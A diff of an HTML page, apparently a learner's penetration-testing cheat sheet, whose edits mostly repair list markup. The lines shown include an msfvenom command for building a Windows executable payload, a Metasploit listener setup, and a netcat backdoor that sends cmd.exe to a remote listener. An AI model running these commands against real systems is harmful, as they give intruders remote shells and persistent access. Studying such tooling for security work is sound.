@@ -299,8 +299,10 @@ Here is a formatted list of basic commands. I used these as I was learning how t
 	<ul>
 		<li>scan for some old vulns</li>
 	</ul>
-	
+</ul>
+
 <h2>Gain and Maintain</h2>
+<ul>
 <li><code>root@kl~# ssh &lt;user&gt;@&lt;ip&gt; </code></li>
 	<ul>
 		<li>establish ssh connection</li>
@@ -332,16 +334,20 @@ Here is a formatted list of basic commands. I used these as I was learning how t
 <li>make a msfvenom payload for windows executable</li>
 	<ul>
 		<li><code>root@kl~# msfvenom –p &lt;payload&gt; lhost=&lt;ip&gt; lport=&lt;port&gt; -f exe –i 2 &gt; &lt;file&gt;.exe </code></li>
-		<li><code>root@kl~# msfvenom –l encoders (for list of encoders)
+		<li><code>root@kl~# msfvenom –l encoders </code>(for list of encoders) </li>
 	</ul>
 <li>set up a listener in metasploit</li>
+	<ul>
 		<li><code>use exploit/multi/handler</code></li>
 		<li><code>set payload</code></li>
 		<li><code>set ExitOnSession false</code></li>
 		<li><code>exploit –j (run as a job)</code></li>
+	</ul>
 <li>netcat backdoor</li>
-	<li><code>root@kl~# nc –l –p &lt;port&gt; (on launch platform)</code></li>
-	<li><code>C:\> start nc &lt;launch ip&gt; &lt;port&gt; -e cmd.exe</code></li>
+	<ul>
+		<li><code>root@kl~# nc –l –p &lt;port&gt; (on launch platform)</code></li>
+		<li><code>C:\> start nc &lt;launch ip&gt; &lt;port&gt; -e cmd.exe</code></li>
+	</ul>
 </ul>			
 			
 <h2>Escalate and Propagate</h2>
